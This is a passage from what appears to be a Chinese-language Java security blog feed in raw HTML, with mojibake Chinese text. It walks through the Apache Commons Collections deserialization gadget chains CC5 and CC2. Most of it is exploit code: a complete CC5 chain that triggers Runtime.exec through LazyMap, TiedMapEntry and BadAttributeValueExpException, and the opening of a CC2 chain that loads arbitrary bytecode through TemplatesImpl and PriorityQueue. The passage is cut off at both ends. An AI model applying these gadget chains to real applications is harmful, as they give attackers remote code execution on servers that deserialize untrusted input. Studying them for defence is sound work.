class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">LazyMapget</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        LazyMapget.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        LazyMapget.invoke(decorateMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344744.png" alt="image-20230709134433612"><br>ÊâßË°åÊàêÂäüÔºåÂú®ËøôÈáåÊàëÂèëÁé∞commons-collectionsÁâàÊú¨ÂæóÁî®3.2.1‰∏çÁÑ∂‰∏ãÈù¢Ëøô‰∏™Âú∞ÊñπÂ∞±‰ºöÊä•Èîô<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091347346.png" alt="image-20230709134754280"><br>Âõ†‰∏∫Âú®<code>commons-collections 4.0</code>ÁâàÊú¨LazyMapÈáåÈù¢Ê≤°ÊúâËøô‰∏™ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344900.png" alt="image-20230709134451829"><br>ÈÇ£‰πàÊé•‰∏ãÊù•Â∞±ÂæóÊää<code>TiedMapEntry</code>Á±ªÂíå<code>LazyMap</code>Á±ªËøûËµ∑Êù•ÔºåÈÇ£‰πàÂÖàÁúã‰∏ÄÁúãËøô‰∏™Á±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(<span class="keyword">final</span> Map&lt;K, V&gt; map, <span class="keyword">final</span> K key)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    <span class="built_in">this</span>.map = map;  </span><br><span class="line">    <span class="built_in">this</span>.key = key;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊòØ‰∏Ä‰∏™publicÁ±ªÈÇ£‰πàË∞ÉÁî®Â∞±Êõ¥Âä†ÁÆÄÂçï‰∫ÜÔºåÊâÄ‰ª•ËøôÈáåÂè™ÈúÄË¶ÅÊääLazyMapÁöÑÂØπË±°decorateMap‰º†ÂÖ•Âç≥ÂèØÔºåÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        tiedMapEntry.toString();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Áé∞Âú®Â∞±ÊòØÂíåÂÖ•Âè£Á±ªËøûËµ∑Êù•Ôºå<code>BadAttributeValueExpException</code> ÁöÑ‰ΩúÁî®ÂüüÊòØpublicÊâÄ‰ª•Áõ¥Êé•new‰∏Ä‰∏™ÂØπË±°Â∞±Ë°åÔºåÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂ∞±ÊòØËÆ©<code>val</code>Âèò‰∏∫<code>TiedMapEntry</code>ÁöÑÂØπË±°ÔºåÂõ†‰∏∫Ëøô‰∏™ÂèòÈáèÊòØÁßÅÊúâÁöÑÊâÄ‰ª•Âà©Áî®ÂèçÂ∞Ñ‰øÆÊîπ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);  </span><br><span class="line"><span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">declaredField.set(badAttributeValueExpException,tiedMapEntry);</span><br></pre></td></tr></table></figure><p>Âà∞ËøôÈáåÂ∞±ÁªìÊùü‰∫ÜÔºåÂÆåÊï¥EXPÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField.set(badAttributeValueExpException,tiedMapEntry);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(badAttributeValueExpException);  </span></span><br><span class="line">      unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091345852.png" alt="image-20230709134507676"></p><h2 id="ÊµÅÁ®ãÂõæ"><a href="#ÊµÅÁ®ãÂõæ" class="headerlink" title="ÊµÅÁ®ãÂõæ"></a>ÊµÅÁ®ãÂõæ</h2><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091348858.png" alt="image-20230709134826810"><br>Á≠âÊääCCÁ≥ªÂàóÂºÑÂÆå‰∫ÜÂÜçÊääËøô‰∏™ÊµÅÁ®ãÂõæÂ•ΩÂ•ΩÂºÑÂºÑÔºåÁõ∏ÂΩì‰∫éÊÄªÁªì‰∏ÄÈÅç‰∫Ü</p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãCCÈìæ2</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE2/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE2/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>ÂíåCC4‰∏ÄÊ†∑ÔºåCommons-Collections ‰æùËµñÂ¶Ç‰∏ã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="ÈìæÂ≠êÂàÜÊûê"><a href="#ÈìæÂ≠êÂàÜÊûê" class="headerlink" title="ÈìæÂ≠êÂàÜÊûê"></a>ÈìæÂ≠êÂàÜÊûê</h2><p>CC2ÂÖ∂ÂÆûÂ∞±ÊòØÂú®CC4‰∏ä‰øÆÊîπÔºåÂÆÉÊòØ‰∏∫‰∫ÜÈÅøÂÖç<code>transform</code>Êï∞ÁªÑÁöÑ‰ΩøÁî®ÔºåËá≥‰∫é‰∏∫‰ªÄ‰πàË¶ÅÈÅøÂÖçÊòØÂõ†‰∏∫shiro‰∏≠ÁöÑÊºèÊ¥û‰ºöÈáçÂÜôÂæàÂ§öÂä®ÊÄÅÂä†ËΩΩÊï∞ÁªÑÁöÑÊñπÊ≥ïÔºåÈÇ£‰πàÂèØËÉΩEXP Êó†Ê≥ïÈÄöËøáÊï∞ÁªÑÂÆûÁé∞ÔºåÂΩìÁÑ∂ÊàëËøòÊ≤°Ë∑üËøáshiroÁöÑÈìæÂ≠êÂà∞Êó∂ÂÄôÂÜçÂéªÂ≠¶‰π†ÔºåÈÇ£‰πàÂà∞ËøôÈáåÂêéÈù¢ÁöÑÊµÅÁ®ãÂõæÂ∞±Â¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061951430.png" alt="image-20230706195111859"><br>ÂâçÈù¢ÁöÑÂ∞±ÊòØCC4ÁöÑ‰∏úË•øÔºåÊâÄ‰ª•ËøôÈáåÂ∞±ÊòØË¶ÅÊää<code>compare</code>‰∏é<code>InvokerTransform</code>ËøûÊé•Ëµ∑Êù•ÁÑ∂ÂêéÂÜçÊää<code>InvokerTransform</code>‰∏é<code>TemplatesImpl</code>ËøûÊé•Ëµ∑Êù•Â∞±OK‰∫ÜÔºåÈÇ£‰πàËøôÈáåÂÖàÊääÂêéÈù¢ÁöÑËß£ÂÜ≥Áõ¥Êé•ÊääCC4ÁöÑÊãøËøáÊù•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//Âä®ÊÄÅÁ±ªÂä†ËΩΩÂëΩ‰ª§ÊâßË°å  </span><br><span class="line">TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">Class tclass = templates.getClass();  </span><br><span class="line">Field nameField = tclass.getDeclaredField(&quot;_name&quot;);  </span><br><span class="line">nameField.setAccessible(true);  </span><br><span class="line">nameField.set(templates,&quot;aaa&quot;);  </span><br><span class="line">  </span><br><span class="line">Field bytecodes = tclass.getDeclaredField(&quot;_bytecodes&quot;);  </span><br><span class="line">bytecodes.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;E://java-tools/test.class&quot;));  </span><br><span class="line">byte[][] codes = &#123;code&#125;;  </span><br><span class="line">bytecodes.set(templates,codes);</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊûÑÈÄ†<code>InvokerTransformer</code>Á±ªÂéªË∞ÉÁî®<code>TemplatesImpl.newTransformer()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂ∞±ÊòØËÆ©<code>TransformingComparator.compare()</code>Âíå<code>InvokerTransformer</code>ËøûÊé•Ëµ∑Êù•ÔºåÂΩìÁÑ∂ËøôÈáåÂíåCC4‰∏ÄÊ†∑‰∏∫‰∫ÜÈÅøÂÖç<code>priorityQueue.add()</code>ÊèêÂâçÊâßË°å<code>compare()</code>ÊñπÊ≥ïÔºåÊâÄ‰ª•‰ª£Á†Å‰πü‰∏ÄÊ†∑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂàõÂª∫ PriorityQueue Á±ªÂØπË±° ‰º†ÂÖ• <code>transformingComparator</code>ÁöÑÂØπË±°‰ΩÜÊòØÊ≠§Êó∂Êàë‰ª¨ÂêëÈòüÂàóÈáåÈù¢Ê∑ªÂä†ÁöÑÂÖÉÁ¥†ÊòØÂâç‚æØÂàõÂª∫ÁöÑ <code>TemplatesImpl</code>ÁöÑÂØπË±°ÔºåËøôÈáåË¶ÅÊ≥®ÊÑèÁöÑÊòØÊ∑ªÂä†Âú®ÈòüÂàóÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†‰ΩçÁΩÆÂõ†‰∏∫ÊúÄÂêéË∞ÉÁî® <code>PriorityQueue.compare()</code> ÁöÑÊó∂ÂÄôÊòØ‰º†ÂÖ•ÈòüÂàó‰∏≠ÁöÑ‰∏§‰∏™ÂØπË±°ÔºåÁÑ∂Âêé <code>compare()</code> ‰∏≠Ë∞ÉÁî® <code>Transformer.transform(obj1)</code> ÁöÑÊó∂ÂÄôÁî®ÁöÑÊòØ‰º†ÂÖ•ÁöÑÁ¨¨‰∏Ä‰∏™ÂØπË±°‰Ωú‰∏∫ÂèÇÊï∞ÔºåË∑üËøõÂéªÁúã‰∏Ä‰∏ãÂç≥ÂèØÁü•ÈÅì<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061951082.png" alt="image-20230706195150985"><br>ÂΩìÁÑ∂‰∏§‰∏™ÈÉΩËÆæÁΩÆ‰∏∫<code>TemplatesImpl</code>ÁöÑÂØπË±°‰πüÊ≤°ÂÖ≥Á≥ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">priorityQueue.add(templates);  </span><br><span class="line">priorityQueue.add(templates);</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂèàÂíåCC4‰∏ÄÊ†∑‰∫ÜÂèçÂ∞ÑÊîπÂõûÊù•Â∞±Ë°åÔºåÁÑ∂ÂêéÊää<code>chainedTransformer</code>Êîπ‰∏∫<code>invokerTransformer</code>Âõ†‰∏∫Êàë‰ª¨ÊòØÁõ¥Êé•ËøûÊé•ÁöÑInvokerTransformÁ±ªÁöÑ<code>transform</code>ÊñπÊ≥ï</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">transformField.set(transformingComparator, invokerTransformer);</span><br></pre></td></tr></table></figure><p>ÈÇ£‰πàÂà∞ËøôÈáåCC2‰πüÂ∞±ÁªìÊùü‰∫ÜÔºåÊúÄÁªàÁöÑexpÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//Âä®ÊÄÅÁ±ªÂä†ËΩΩÂëΩ‰ª§ÊâßË°å  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span 